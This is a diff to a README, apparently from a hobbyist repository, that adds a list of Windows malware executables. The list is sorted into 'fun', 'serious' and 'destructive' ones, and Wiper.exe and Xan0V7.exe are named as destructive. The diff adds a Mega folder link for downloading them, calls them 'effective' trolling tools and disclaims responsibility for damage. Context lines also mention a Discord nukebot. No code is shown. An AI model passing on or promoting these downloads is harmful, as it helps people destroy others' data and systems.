@@ -13,9 +13,30 @@ Also PLEASE add python to PATH!!!
 
 And before you do anything with the codes... Read the `setup.md` files or the `tutorial.md` files!
 
-# GDI Virusses:
+# Virusses:
 
-**currently not avaliable due to a computer reset and loss of accounts**
+**FUN:**
+- Goofy.exe
+- notajumpscare.exe
+**SERIOUS:**
+- fettfish.exe
+- RBUBBLE.exe
+- Xan0V1.exe
+- Xan0V7.exe
+**IDK:**
+- Discowd.exe
+- Wiper.exe
+
+**Destructive:**
+- Xan0V7.exe
+- Wiper.exe
+
+The other ones are just to mess around and troll. But they are still effective.
+ 
+[Get them here](https://mega.nz/folder/ibpC2azD#iS9lGNHBK81T1hP31jUS5w)
+
+I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED.
+I am just the Creator :)
 
 # Discord Nukebot:
 
